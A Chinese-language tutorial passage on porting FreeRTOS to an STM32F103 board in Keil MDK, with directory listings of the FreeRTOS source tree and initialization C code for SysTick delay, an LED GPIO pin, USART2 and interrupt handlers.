class="txt">ARM7_AT91FR40008_GCCARM7_AT91SAM7S64_IARARM7_AT91SAM7X256_EclipseARM7_LPC2106_GCCARM7_LPC2129_IARARM7_LPC2129_Keil_RVDSARM7_LPC2138_RowleyARM7_LPC2368_EclipseARM7_LPC2368_RowleyARM7_STR71x_IARARM7_STR75x_GCCARM7_STR75x_IARARM9_AT91SAM9XE_IARARM9_STR91X_IARAVR32_UC3AVR_ATMega323_IARAVR_ATMega323_WinAVRColdFire_MCF51CN128_CodeWarriorColdFire_MCF52221_CodeWarriorColdFire_MCF52233_EclipseColdFire_MCF52259_CodeWarriorColdFire_MCF5282_EclipseCommonCORTEX_A2F200_IAR_and_KeilCORTEX_A2F200_SoftConsoleCORTEX_A53_64-bit_UltraScale_MPSoCCORTEX_A5_SAMA5D2x_Xplained_IARCORTEX_A5_SAMA5D3x_Xplained_IARCORTEX_A5_SAMA5D4x_EK_IARCORTEX_A9_Cyclone_V_SoC_DKCORTEX_A9_RZ_R7S72100_IAR_DS-5CORTEX_A9_Zynq_ZC702CORTEX_AT91SAM3U256_IARCORTEX_ATSAM3S-EK2_Atmel_StudioCORTEX_ATSAM3X_Atmel_StudioCORTEX_CY8C5588_PSoC_Creator_GCCCORTEX_CY8C5588_PSoC_Creator_KeilCORTEX_CY8C5588_PSoC_Creator_RVDSCORTEX_EFM32_Giant_Gecko_Simplicity_StudioCORTEX_EFM32_Pearl_Gecko_Simplicity_StudioCORTEX_EFMG890F128_IARCORTEX_Kinetis_K60_Tower_IARCORTEX_LM3S102_GCCCORTEX_LM3S102_RowleyCORTEX_LM3S316_IARCORTEX_LM3S811_GCCCORTEX_LM3S811_IARCORTEX_LM3S811_KEILCORTEX_LM3Sxxxx_EclipseCORTEX_LM3Sxxxx_IAR_KeilCORTEX_LM3Sxxxx_RowleyCORTEX_LPC1768_GCC_RedSuiteCORTEX_LPC1768_GCC_RowleyCORTEX_LPC1768_IARCORTEX_M0+_Atmel_SAMD20_XPlainedCORTEX_M0_Infineon_XMC1000_IAR_Keil_GCCCORTEX_M0_LPC1114_LPCXpressoCORTEX_M0_STM32F0518_IARCORTEX_M4F_ATSAM4E_Atmel_StudioCORTEX_M4F_CEC1302_Keil_GCCCORTEX_M4F_CEC1302_MikroCCORTEX_M4F_Infineon_XMC4000_GCC_DaveCORTEX_M4F_Infineon_XMC4000_IARCORTEX_M4F_Infineon_XMC4000_KeilCORTEX_M4F_Infineon_XMC4000_TaskingCORTEX_M4F_Infineon_XMC4500_GCC_AtollicCORTEX_M4F_M0_LPC43xx_KeilCORTEX_M4F_MSP432_LaunchPad_IAR_CCS_KeilCORTEX_M4F_STM32F407ZG-SKCORTEX_M4_ATSAM4L_Atmel_StudioCORTEX_M4_ATSAM4S_Atmel_StudioCORTEX_M7_SAME70_Xplained_AtmelStudioCORTEX_M7_SAMV71_Xplained_AtmelStudioCORTEX_M7_SAMV71_Xplained_IAR_KeilCORTEX_M7_STM32F7_STM32756G-EVAL_IAR_KeilCORTEX_MB9A310_IAR_KeilCORTEX_MB9B500_IAR_KeilCORTEX_MPU_LM3Sxxxx_RowleyCORTEX_MPU_LPC1768_GCC_RedSuiteCORTEX_MPU_Simulator_Keil_GCCCORTEX_R4F_RZ_T_GCC_IARCORTEX_R4_RM48_TMS570_CCS5CORTEX_R5_UltraScale_MPSoCCORTEX_SmartFusion2_M2S050_SoftConsoleCORTEX_STM32F100_AtollicCORTEX_STM32F103_GCC_RowleyCORTEX_STM32F103_IARCORTEX_STM32F103_KeilCORTEX_STM32F103_Primer_GCCCORTEX_STM32F107_GCC_RowleyCORTEX_STM32L152_Discovery_IARCORTEX_STM32L152_IARCORTUS_APS3_GCCCygnaldsPIC_MPLABFlshliteH8SHCS12_CodeWarrior_bankedHCS12_CodeWarrior_smallHCS12_GCC_bankedIA32_flat_GCC_Galileo_Gen_2lwIP_AVR32_UC3lwIP_Demo_Rowley_ARM7lwIP_MCF5235_GCCMB91460_SoftuneMB96340_SoftuneMB96350_Softune_Dice_KitMCF5235_GCCMicroBlaze_Kintex7_EthernetLiteMicroBlaze_Spartan-6_EthernetLiteMSP430X_MSP430F5438_CCSMSP430X_MSP430F5438_IARMSP430X_MSP430FR5969_LaunchPad_IAR_CCSmsp430_CrossWorksmsp430_GCCmsp430_IARNEC_78K0R_IARNEC_V850ES_IARNiosII_CycloneIII_DBC3C40_GCCPCPIC18_MPLABPIC18_WizCPIC24_MPLABPIC32MEC14xx_MPLABPIC32MX_MPLABPIC32MZ_MPLABPPC405_FPU_Xilinx_Virtex4_GCCPPC405_Xilinx_Virtex4_GCCPPC440_DP_FPU_Xilinx_Virtex5_GCCPPC440_SP_FPU_Xilinx_Virtex5_GCCPPC440_Xilinx_Virtex5_GCCRL78_multiple_IARRL78_RL78G13_Promo_Board_IARRX100-RSK_GCC_e2studioRX100-RSK_IARRX100-RSK_Renesas_e2studioRX100_RX113-RSK_GCC_e2studio_IARRX100_RX113-RSK_Renesas_e2studioRX200_RX210-RSK_RenesasRX200_RX231-RSK_GCC_e2studio_IARRX200_RX231-RSK_Renesas_e2studioRX600_RX62N-RDK_GNURXRX600_RX62N-RDK_IARRX600_RX62N-RDK_RenesasRX600_RX62N-RSK_GNURXRX600_RX62N-RSK_IARRX600_RX62N-RSK_RenesasRX600_RX630-RSK_RenesasRX600_RX63N-RDK_RenesasRX600_RX64M_RSK_GCC_e2studioRX600_RX64M_RSK_Renesas_e2studioRX700_RX71M_RSK_GCC_e2studio_IARRX700_RX71M_RSK_Renesas_e2studioSuperH_SH7216_RenesasTriCore_TC1782_TriBoard_GCCuIP_Demo_IAR_ARM7uIP_Demo_Rowley_ARM7Unsupported_DemosWIN32-MingWWIN32-MSVCWIN32-MSVC-Static-Allocation-OnlyWizNET_DEMO_GCC_ARM7WizNET_DEMO_TERN_186Xilinx_FreeRTOS_BSP</code></pre><h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p>Source 是 FreeRTOS 的核心，包含了系统内核及各类处理器系统移植所需的源码。</p><pre><code class="txt">D:\FREERTOSV9.0.0\FREERTOS\SOURCE│  croutine.c│  event_groups.c│  list.c│  queue.c│  readme.txt│  tasks.c│  timers.c│├─include│      croutine.h│      deprecated_definitions.h│      event_groups.h│      FreeRTOS.h│      list.h│      mpu_prototypes.h│      mpu_wrappers.h│      portable.h│      projdefs.h│      queue.h│      semphr.h│      StackMacros.h│      stdint.readme│      task.h│      timers.h│└─portable    │  readme.txt    │    ├─BCC    │  └─16BitDOS    │      ├─common    │      │      portasm.h    │      │      portcomn.c    │      │    │      ├─Flsh186    │      │      port.c    │      │      prtmacro.h    │      │    │      └─PC    │              port.c    │              prtmacro.h    │    ├─CCS    │  ├─ARM_CM4F    │  │      port.c    │  │      portasm.asm    │  │      portmacro.h    │  │    │  ├─ARM_Cortex-R4    │  │      port.c    │  │      portASM.asm    │  │      portmacro.h    │  │    │  └─MSP430X    │          data_model.h    │          port.c    │          portext.asm    │          portmacro.h    │    ├─CodeWarrior    │  ├─ColdFire_V1    │  │      port.c    │  │      portasm.S    │  │      portmacro.h    │  │    │  ├─ColdFire_V2    │  │      port.c    │  │      portasm.S    │  │      portmacro.h    │  │    │  └─HCS12    │          port.c    │          portmacro.h    │    ├─Common    │      mpu_wrappers.c    │    ├─GCC    │  ├─ARM7_AT91FR40008    │  │      port.c    │  │      portISR.c    │  │      portmacro.h    │  │    │  ├─ARM7_AT91SAM7S    │  │      AT91SAM7X256.h    │  │      ioat91sam7x256.h    │  │      lib_AT91SAM7X256.c    │  │      lib_AT91SAM7X256.h    │  │      port.c    │  │      portISR.c    │  │      portmacro.h    │  │    │  ├─ARM7_LPC2000    │  │      port.c    │  │      portISR.c    │  │      portmacro.h    │  │    │  ├─ARM7_LPC23xx    │  │      port.c    │  │      portISR.c    │  │      portmacro.h    │  │    │  ├─ARM_CA53_64_BIT    │  │      port.c    │  │      portASM.S    │  │      portmacro.h    │  │    │  ├─ARM_CA9    │  │      port.c    │  │      portASM.S    │  │      portmacro.h    │  │    │  ├─ARM_CM0    │  │      port.c    │  │      portmacro.h    │  │    │  ├─ARM_CM3    │  │      port.c    │  │      portmacro.h    │  │    │  ├─ARM_CM3_MPU    │  │      port.c    │  │      portmacro.h    │  │    │  ├─ARM_CM4F    │  │      port.c    │  │      portmacro.h    │  │    │  ├─ARM_CM4_MPU    │  │      port.c    │  │      portmacro.h    │  │    │  ├─ARM_CM7    │  │  │  ReadMe.txt    │  │  │    │  │  └─r0p1    │  │          port.c    │  │          portmacro.h    │  │    │  ├─ARM_CR5    │  │      port.c    │  │      portASM.S    │  │      portmacro.h    │  │    │  ├─ARM_CRx_No_GIC    │  │      port.c    │  │      portASM.S    │  │      portmacro.h    │  │    │  ├─ATMega323    │  │      port.c    │  │      portmacro.h    │  │    │  ├─AVR32_UC3    │  │      exception.S    │  │      port.c    │  │      portmacro.h    │  │    │  ├─ColdFire_V2    │  │      port.c    │  │      portasm.S    │  │      portmacro.h    │  │    │  ├─CORTUS_APS3    │  │      port.c    │  │      portmacro.h    │  │    │  ├─H8S2329    │  │      port.c    │  │      portmacro.h    │  │    │  ├─HCS12    │  │      port.c    │  │      portmacro.h    │  │    │  ├─IA32_flat    │  │      ISR_Support.h    │  │      port.c    │  │      portASM.S    │  │      portmacro.h    │  │    │  ├─MCF5235    │  │      port.c    │  │      portmacro.h    │  │    │  ├─MicroBlaze    │  │      port.c    │  │      portasm.s    │  │      portmacro.h    │  │    │  ├─MicroBlazeV8    │  │      port.c    │  │      portasm.S    │  │      portmacro.h    │  │      port_exceptions.c    │  │    │  ├─MicroBlazeV9    │  │      port.c    │  │      portasm.S    │  │      portmacro.h    │  │      port_exceptions.c    │  │    │  ├─MSP430F449    │  │      port.c    │  │      portmacro.h    │  │    │  ├─NiosII    │  │      port.c    │  │      portmacro.h    │  │      port_asm.S    │  │    │  ├─PPC405_Xilinx    │  │      FPU_Macros.h    │  │      port.c    │  │      portasm.S    │  │      portmacro.h    │  │    │  ├─PPC440_Xilinx    │  │      FPU_Macros.h    │  │      port.c    │  │      portasm.S    │  │      portmacro.h    │  │    │  ├─RL78    │  │      isr_support.h    │  │      port.c    │  │      portasm.S    │  │      portmacro.h    │  │    │  ├─RX100    │  │      port.c    │  │      portmacro.h    │  │    │  ├─RX600    │  │      port.c    │  │      portmacro.h    │  │    │  ├─RX600v2    │  │      port.c    │  │      portmacro.h    │  │    │  ├─STR75x    │  │      port.c    │  │      portISR.c    │  │      portmacro.h    │  │    │  └─TriCore_1782    │          port.c    │          portmacro.h    │          porttrap.c    │    ├─IAR    │  ├─78K0R    │  │      ISR_Support.h    │  │      port.c    │  │      portasm.s26    │  │      portmacro.h    │  │    │  ├─ARM_CA5_No_GIC    │  │      port.c    │  │      portASM.h    │  │      portASM.s    │  │      portmacro.h    │  │    │  ├─ARM_CA9    │  │      port.c    │  │      portASM.h    │  │      portASM.s    │  │      portmacro.h    │  │    │  ├─ARM_CM0    │  │      port.c    │  │      portasm.s    │  │      portmacro.h    │  │    │  ├─ARM_CM3    │  │      port.c    │  │      portasm.s    │  │      portmacro.h    │  │    │  ├─ARM_CM4F    │  │      port.c    │  │      portasm.s    │  │      portmacro.h    │  │    │  ├─ARM_CM7    │  │  │  ReadMe.txt    │  │  │    │  │  └─r0p1    │  │          port.c    │  │          portasm.s    │  │          portmacro.h    │  │    │  ├─ARM_CRx_No_GIC    │  │      port.c    │  │      portASM.s    │  │      portmacro.h    │  │    │  ├─ATMega323    │  │      port.c    │  │      portmacro.h    │  │      portmacro.s90    │  │    │  ├─AtmelSAM7S64    │  │      AT91SAM7S64.h    │  │      AT91SAM7S64_inc.h    │  │      AT91SAM7X128.h    │  │      AT91SAM7X128_inc.h    │  │      AT91SAM7X256.h    │  │      AT91SAM7X256_inc.h    │  │      ISR_Support.h    │  │      lib_AT91SAM7S64.h    │  │      lib_AT91SAM7X128.h    │  │      lib_AT91SAM7X256.h    │  │      port.c    │  │      portasm.s79    │  │      portmacro.h    │  │    │  ├─AtmelSAM9XE    │  │      ISR_Support.h    │  │      port.c    │  │      portasm.s79    │  │      portmacro.h    │  │    │  ├─AVR32_UC3    │  │      exception.s82    │  │      port.c    │  │      portmacro.h    │  │      read.c    │  │      write.c    │  │    │  ├─LPC2000    │  │      ISR_Support.h    │  │      port.c    │  │      portasm.s79    │  │      portmacro.h    │  │    │  ├─MSP430    │  │      port.c    │  │      portasm.h    │  │      portext.s43    │  │      portmacro.h    │  │    │  ├─MSP430X    │  │      data_model.h    │  │      port.c    │  │      portext.s43    │  │      portmacro.h    │  │    │  ├─RL78    │  │      ISR_Support.h    │  │      port.c    │  │      portasm.s87    │  │      portmacro.h    │  │    │  ├─RX100    │  │      port.c    │  │      portmacro.h    │  │      port_asm.s    │  │    │  ├─RX600    │  │      port.c    │  │      portmacro.h    │  │      port_asm.s    │  │    │  ├─RXv2    │  │      port.c    │  │      portmacro.h    │  │      port_asm.s    │  │    │  ├─STR71x    │  │      ISR_Support.h    │  │      port.c    │  │      portasm.s79    │  │      portmacro.h    │  │    │  ├─STR75x    │  │      ISR_Support.h    │  │      port.c    │  │      portasm.s79    │  │      portmacro.h    │  │    │  ├─STR91x    │  │      ISR_Support.h    │  │      port.c    │  │      portasm.s79    │  │      portmacro.h    │  │    │  └─V850ES    │          ISR_Support.h    │          port.c    │          portasm.s85    │          portasm_Fx3.s85    │          portasm_Hx2.s85    │          portmacro.h    │    ├─Keil    │      See-also-the-RVDS-directory.txt    │    ├─MemMang    │      heap_1.c    │      heap_2.c    │      heap_3.c    │      heap_4.c    │      heap_5.c    │      ReadMe.url    │    ├─MikroC    │  └─ARM_CM4F    │          port.c    │          portmacro.h    │    ├─MPLAB    │  ├─PIC18F    │  │      port.c    │  │      portmacro.h    │  │      stdio.h    │  │    │  ├─PIC24_dsPIC    │  │      port.c    │  │      portasm_dsPIC.S    │  │      portasm_PIC24.S    │  │      portmacro.h    │  │    │  ├─PIC32MEC14xx    │  │      ISR_Support.h    │  │      port.c    │  │      portmacro.h    │  │      port_asm.S    │  │    │  ├─PIC32MX    │  │      ISR_Support.h    │  │      port.c    │  │      portmacro.h    │  │      port_asm.S    │  │    │  └─PIC32MZ    │          ISR_Support.h    │          port.c    │          portmacro.h    │          port_asm.S    │    ├─MSVC-MingW    │      port.c    │      portmacro.h    │    ├─oWatcom    │  └─16BitDOS    │      ├─common    │      │      portasm.h    │      │      portcomn.c    │      │    │      ├─Flsh186    │      │      port.c    │      │      portmacro.h    │      │    │      └─PC    │              port.c    │              portmacro.h    │    ├─Paradigm    │  └─Tern_EE    │      ├─large_untested    │      │      port.c    │      │      portasm.h    │      │      portmacro.h    │      │    │      └─small    │              port.c    │              portasm.h    │              portmacro.h    │    ├─Renesas    │  ├─RX100    │  │      port.c    │  │      portmacro.h    │  │      port_asm.src    │  │    │  ├─RX200    │  │      port.c    │  │      portmacro.h    │  │      port_asm.src    │  │    │  ├─RX600    │  │      port.c    │  │      portmacro.h    │  │      port_asm.src    │  │    │  ├─RX600v2    │  │      port.c    │  │      portmacro.h    │  │      port_asm.src    │  │    │  └─SH2A_FPU    │          ISR_Support.inc    │          port.c    │          portasm.src    │          portmacro.h    │    ├─Rowley    │  ├─ARM7    │  │      readme.txt    │  │    │  └─MSP430F449    │          port.c    │          portasm.h    │          portext.asm    │          portmacro.h    │    ├─RVDS    │  ├─ARM7_LPC21xx    │  │      port.c    │  │      portASM.s    │  │      portmacro.h    │  │      portmacro.inc    │  │    │  ├─ARM_CA9    │  │      port.c    │  │      portASM.s    │  │      portmacro.h    │  │      portmacro.inc    │  │    │  ├─ARM_CM0    │  │      port.c    │  │      portmacro.h    │  │    │  ├─ARM_CM3    │  │      port.c    │  │      portmacro.h    │  │    │  ├─ARM_CM4F    │  │      port.c    │  │      portmacro.h    │  │    │  ├─ARM_CM4_MPU    │  │      port.c    │  │      portmacro.h    │  │    │  └─ARM_CM7    │      │  ReadMe.txt    │      │    │      └─r0p1    │              port.c    │              portmacro.h    │    ├─SDCC    │  └─Cygnal    │          port.c    │          portmacro.h    │    ├─Softune    │  ├─MB91460    │  │      port.c    │  │      portmacro.h    │  │      __STD_LIB_sbrk.c    │  │    │  └─MB96340    │          port.c    │          portmacro.h    │          __STD_LIB_sbrk.c    │    ├─Tasking    │  └─ARM_CM4F    │          port.c    │          portmacro.h    │          port_asm.asm    │    └─WizC        └─PIC18            │  addFreeRTOS.h            │  Install.bat            │  port.c            │  portmacro.h            │            └─Drivers                └─Tick                        isrTick.c                        Tick.c</code></pre><h2 id="系统移植"><a href="#系统移植" class="headerlink" title="系统移植"></a>系统移植</h2><p>以 stm32f103RCT6 为例，选择 Keil MDK v5.21.1.0 作为开发平台进行系统移植。</p><h3 id="功能描述"><a href="#功能描述" class="headerlink" title="功能描述"></a>功能描述</h3><ol><li>PB10 作为输出口，控制 LED 的亮灭；</li><li>编写延时函数 delay ，以毫秒为单位；</li><li>使用 USART2 循环发送数据，波特率9600，8位数据位，1位停止位，无校验，无硬件控制流；</li><li>系统移植，添加 3 个 task：vLEDOnTask，vLEDOffTask，vUasrtSendTask</li></ol><h3 id="创建项目-BrightLed"><a href="#创建项目-BrightLed" class="headerlink" title="创建项目 (BrightLed)"></a>创建项目 (BrightLed)</h3><ul><li>选择芯片 (stm32f103RCT6)</li></ul><p><img src="/assets/stm32/selectChip.png" alt="选择芯片"></p><ul><li>选择外设</li></ul><p>自从 Keil MDK 更新至 v5.0 以后，软件安装完成便可使用 &quot;Pack installer&quot; 让其自动下载所需的软件包；新建项目也变得更加简单方便，可以使用 &quot;manager run-time environment&quot; 选择所需的片内外设。</p><pre><code class="txt">Software Compoent├─CMSIS│    │  CORE│    │└─Device     │  GPIO     │  Startup     │     └─stdPeriph Drivers         │  Framework         │  GPIO         │  RCC         │  USARTs</code></pre><p>外设说明：</p><ol><li><strong>CORE</strong>(必选)： 提供与 Cortex-M0、<strong>Cortex-M3</strong>、Cortex-M4、SC000 和 SC300 处理器与外围寄存器之间的接口</li><li><strong>Framework</strong>(必选)： 标准外设驱动框架(Standard Peripheral Drivers Framework)</li><li><strong>RCC</strong>(必选)： 提供与系统时钟相关的库函数</li><li><strong>GPIO</strong>： 提供与通用IO接口相关的库函数</li><li><strong>USART</strong>： 提供与UART/USART相关的库函数</li></ol><p><img src="/assets/stm32/selectDevice.png" alt="选择外设"></p><ul><li>设置参数</li></ul><p>打开 <code>Options for target</code>，依次设置下列参数：</p><ol><li>Target &gt; Xtal(MHz)): 8.0</li><li>C/C++  &gt; Define: USE_STDPERIPH_DRIVER,STM32F10X_MD</li><li>Debug  &gt; Use: ST-Link Debugger<br> 3.1 Settings &gt; Debug &gt; Debug Adapter: ST-LINK/V2; Port:SW; Max: 1.8MHz<br> 3.2 Settings &gt; Flash Download &gt; Reset and Run:[√]<br> 3.3 Settings &gt; Flash Download &gt; Programming Algorithm: STM32f10x Med-density Flash</li></ol><p>所有参数均设置完成后，项目创建过程就结束了。</p><p><img src="/assets/stm32/setSymbols.png" alt="设置Processing Symbols"></p><p><img src="/assets/stm32/selectFlash.png" alt="选择flash大小"></p><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>创建项目后，需要编写代码以实现对系统时钟及所需外设的初始化。</p><ul><li>初始化流程</li></ul><ol><li>首先，将默认组名称改为 <code>USER</code> ，并在本地项目目录下添加文件夹，命名为 &quot;USER&quot; 。</li><li>其次，新建并保存以下文件至 &quot;USER&quot; 文件夹，同时添加其中的 .c 文件到项目组 <code>USER</code>中。<br> 2.1 主程序：main.c / main.h<br> 2.2 中断程序：stm32f10x_it.c / stm32f10x_it.h<br> 2.3 延时模块: delay.c / delay.h<br> 2.4 led控制模块：led.c / led.h<br> 2.5 串口通信模块：usart.c / usart.h</li><li>最后，对各个文件进行编码，完成各项初始化任务</li></ol><ul><li>项目文件结构</li></ul><p><img src="/assets/stm32/projectFile.png" alt="项目目录"></p><ul><li>初始化程序设计</li></ul><blockquote><p><strong>delay.c / delay.h</strong></p></blockquote><p>delay.c</p><pre><code class="C">#include &quot;delay.h&quot;volatile u32 TimingDelay;void delayInit(void)&#123;  /* SystemFrequency / 1000    1ms   * SystemFrequency / 100000   10us   * SystemFrequency / 1000000 1us   */  #define SYSCLK_FREQ_72MHz  72000000    // 系统主频  if (SysTick_Config(SYSCLK_FREQ_72MHz / 1000000))  &#123;  /* Capture error */    while (1);  &#125;  SysTick-&gt;CTRL &amp;= ~SysTick_CTRL_ENABLE_Msk;&#125;// ms级延时函数void delay(__IO u32 nTime)&#123;  TimingDelay = nTime * 1000;  SysTick-&gt;CTRL |= SysTick_CTRL_ENABLE_Msk;  while(TimingDelay != 0);&#125;// us级延时函数void delayMicroseconds(__IO u32 nTime)&#123;  TimingDelay = nTime;  SysTick-&gt;CTRL |= SysTick_CTRL_ENABLE_Msk;  while(TimingDelay != 0);&#125;</code></pre><p>delay.h</p><pre><code class="C">#ifndef DELAY_H_#define DELAY_H_#include &quot;stm32f10x.h&quot;void delayInit(void);void delay(__IO u32 nTime);void delayMicroseconds(__IO u32 nTime);#endif /* DELAY_H_ */</code></pre><blockquote><p><strong>led.c / led.h</strong></p></blockquote><p>led.c</p><pre><code class="C">#include &quot;led.h&quot;void ledGPIOConfiguration(void)&#123;  GPIO_InitTypeDef  GPIO_InitStructure;  GPIO_InitStructure.GPIO_Pin = GPIO_Pin_10;  GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz;  GPIO_InitStructure.GPIO_Mode = GPIO_Mode_Out_PP;  GPIO_Init(GPIOB, &amp;GPIO_InitStructure);&#125;</code></pre><p>led.h</p><pre><code class="C">#ifndef LED_H#define LED_H#include &quot;stm32f10x.h&quot;#define LED_PORT (GPIO_Pin_10)void ledGPIOConfiguration(void);#endif /* LED_H */</code></pre><blockquote><p><strong>usart.c / usart.h</strong></p></blockquote><p>usart.c</p><pre><code class="C">#include &quot;usart.h&quot;//串口驱动应用标志static bool Derive_UART2SendFlag, Derive_UART2TxIntState;//开串口 并执行初始化//8位数据位 无校验 1位起始位/1位停止位 允许收发中断  宏定义BAUDRATE设定波特率 低优先级中断void usart2Config(void)&#123;  //波特率设置  #define   UART_BAUDDEF  9600  GPIO_InitTypeDef    GPIO_InitStructure;  USART_InitTypeDef   USART_InitStructure;  NVIC_InitTypeDef NVIC_InitStructure;  RCC_APB1PeriphClockCmd(RCC_APB1Periph_USART2, ENABLE);  //管脚配置  GPIO_InitStructure.GPIO_Pin = GPIO_Pin_2;  GPIO_InitStructure.GPIO_Mode = GPIO_Mode_AF_PP;  GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz;  GPIO_Init(GPIOA, &amp;GPIO_InitStructure);      /* TXIO */  GPIO_InitStructure.GPIO_Pin = GPIO_Pin_3;  GPIO_InitStructure.GPIO_Mode = GPIO_Mode_IN_FLOATING;  GPIO_Init(GPIOA, &amp;GPIO_InitStructure);       /* RXIO */  //串口工作模式配置  USART_InitStructure.USART_BaudRate = UART_BAUDDEF;  USART_InitStructure.USART_WordLength = USART_WordLength_8b;  USART_InitStructure.USART_StopBits = USART_StopBits_1;  USART_InitStructure.USART_Parity = USART_Parity_No ;  USART_InitStructure.USART_HardwareFlowControl = USART_HardwareFlowControl_None;  USART_InitStructure.USART_Mode = USART_Mode_Rx | USART_Mode_Tx;  USART_Init(USART2, &amp;USART_InitStructure);  //中断设置  NVIC_InitStructure.NVIC_IRQChannel = USART2_IRQn;  NVIC_InitStructure.NVIC_IRQChannelPreemptionPriority = 1;       //低优先级别的中断  NVIC_InitStructure.NVIC_IRQChannelSubPriority = 0;        //响应中断等级为0  NVIC_InitStructure.NVIC_IRQChannelCmd = ENABLE;  NVIC_Init(&amp;NVIC_InitStructure);  Derive_UART2TxIntState = false;  USART_ITConfig(USART2, USART_IT_RXNE, ENABLE);  //START  USART_Cmd(USART2, ENABLE);&#125;//从串口发送一个字节void UARTSendByByter(u16 Data)&#123;  //发送数据  USART_SendData(USART2, (u8)Data);  if(!Derive_UART2TxIntState)  &#123;    Derive_UART2TxIntState = true;    USART_ITConfig(USART2, USART_IT_TXE, ENABLE);  &#125;  Derive_UART2SendFlag = true;&#125;//串口收发中断处理函数void UART_TRxOver_Interrupt(void)&#123;  if(USART_GetITStatus(USART2, USART_IT_TXE) == SET)  &#123;    //发送中断    //清零标志    USART_ClearITPendingBit(USART2, USART_IT_TXE);    Derive_UART2SendFlag = false;    //tx interrupt..    //...    if(!Derive_UART2SendFlag)    &#123;        USART_ITConfig(USART2, USART_IT_TXE, DISABLE);        Derive_UART2TxIntState = false;    &#125;  &#125;  if(USART_GetITStatus(USART2, USART_IT_RXNE) == SET)  &#123;    //接收中断    //-------- 回传接收到的数据 --------    UARTSendByByter(USART_ReceiveData(USART2));    USART_ClearFlag(USART2,USART_FLAG_RXNE);  &#125;&#125;</code></pre><p>usart.h</p><pre><code class="C">#ifndef USART_H#define USART_H#include &quot;stm32f10x.h&quot;#include &quot;stm32f10x_rcc.h&quot;#include &quot;stm32f10x_gpio.h&quot;#include &quot;stm32f10x_usart.h&quot;#define false 0#define true 1typedef unsigned char bool;void usart2Config(void);void UARTSendByByter(u16 Data);#endif  /* USART_H */</code></pre><blockquote><p><strong>stm32f10x_it.c / stm32f10x_it.h</strong></p></blockquote><p>stm32f10x_it.c</p><pre><code class="C">#include &quot;stm32f10x_it.h&quot;void NMI_Handler(void)&#123;&#125;void HardFault_Handler(void)&#123;  /* Go to infinite loop when Hard Fault exception occurs */  while (1)  &#123;  &#125;&#125;void MemManage_Handler(void)&#123;  /* Go to infinite loop when Memory Manage exception occurs */  while (1)  &#123;  &#125;&#125;void BusFault_Handler(void)&#123;  /* Go to infinite loop when Bus Fault exception occurs */  while (1)  &#123;  &#125;&#125;void UsageFault_Handler(void)&#123;  /* Go to infinite loop when Usage Fault exception occurs */  while (1)  &#123;  &#125;&#125;#ifndef RTE_RTOS_RTXvoid SVC_Handler(void)&#123;&#125;#endifvoid DebugMon_Handler(void)&#123;&#125;#ifndef RTE_RTOS_RTXvoid PendSV_Handler(void)&#123;&#125;#endifextern volatile u32 TimingDelay;void SysTick_Handler(void) &#123;  if (TimingDelay != 0x00) &#123;    TimingDelay--;  &#125;&#125;extern void UART_TRxOver_Interrupt(void);void USART2_IRQHandler(void)&#123;  UART_TRxOver_Interrupt();&#125;</code></pre><p>stm32f10x_it.h</p><pre><code class="C">#ifndef __STM32F10x_IT_H#define __STM32F10x_IT_H#ifdef __cplusplus extern &quot;C&quot; &#123;#endif/* Includes ------------------------------------------------------------------*/#include &quot;stm32f10x.h&quot;/* Exported types ------------------------------------------------------------*//* Exported constants --------------------------------------------------------*//* Exported macro ------------------------------------------------------------*//* Exported functions --------------------------------------------------------*/void NMI_Handler(void);void HardFault_Handler(void);void MemManage_Handler(void);void BusFault_Handler(void);void UsageFault_Handler(void);void SVC_Handler(void);void DebugMon_Handler(void);void PendSV_Handler(void);void SysTick_Handler(void);void USART2_IRQHandler(void);#ifdef __cplusplus&#125;#endif#endif /* __STM32F10x_IT_H */</code></pre><blockquote><p><strong>main.c / main.h</strong></p></blockquote><p>main.c</p><pre><code class="C">/******************************************************************************* * Header       : Learning FreeRTOS * File Name    : main.c * Author       : wgt * Date         : 2016.11.2 * Description  : *******************************************************************************/#include &quot;main.h&quot;/* ENABLE the clk of GPIO */static void deviceInit(void);/* setup the hardware of system */static void prvSetupHardware(void);/******************************************************************************** Function Name  : main* Description    : main function,the interface of system* Input          : None* Return         : None*******************************************************************************/int main(void)&#123;  prvSetupHardware();  // 设备初始化  while(1)  &#123;  &#125;&#125;/******************************************************************************** Function Name  : prvSetupHardware* Description    : initial hardwares* Input          : None* Return         : None*******************************************************************************/static void prvSetupHardware(void)&#123;  deviceInit();  delayInit();    // SysTick滴答时钟初始化  ledGPIOConfiguration();  usart2Config();&#125;/******************************************************************************** Function Name  : deviceInit* Description    : ENABLE the clk of GPIO* Input          : None* Return         : None*******************************************************************************/static void deviceInit(void)&#123;  //--------------------------- CLK INIT, HSE PLL ----------------------------  ErrorStatus HSEStartUpStatus;  //RCC reset  RCC_DeInit();  //开启外部时钟 并执行初始化  RCC_HSEConfig(RCC_HSE_ON);  //等待外部时钟准备好  HSEStartUpStatus = RCC_WaitForHSEStartUp();  //启动失败 在这里等待  while(HSEStartUpStatus == ERROR);  //设置内部总线时钟  RCC_HCLKConfig(RCC_SYSCLK_Div1);  RCC_PCLK1Config(RCC_HCLK_Div1);  RCC_PCLK2Config(RCC_HCLK_Div1);  //外部时钟为8M 这里倍频到72M  RCC_PLLConfig(RCC_PLLSource_HSE_Div1, RCC_PLLMul_9);  RCC_PLLCmd(ENABLE);  while(RCC_GetFlagStatus(RCC_FLAG_PLLRDY) == RESET);  RCC_SYSCLKConfig(RCC_SYSCLKSource_PLLCLK);  while(RCC_GetSYSCLKSource() != 0x08);  //----------------------------- CLOSE HSI ---------------------------  //关闭内部时钟HSI  RCC_HSICmd(DISABLE);  //中断配置 2-level interrupt  NVIC_PriorityGroupConfig(NVIC_PriorityGroup_2);  //开总中断  __enable_irq();  /******************   OPEN GPIO CLK   **************/  RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOA, ENABLE);  RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOB, ENABLE);  RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOC, ENABLE);  RCC_APB2PeriphClockCmd(RCC_APB2Periph_AFIO, ENABLE);&#125;</code></pre><p>main.h</p><pre><code class="C">#ifndef MAIN_H#define MAIN_H#include &quot;stm32f10x.h&quot;#include &quot;delay.h&quot;#include &quot;usart.h&quot;#include &quot;led.h&quot;#endif  /* MAIN_H 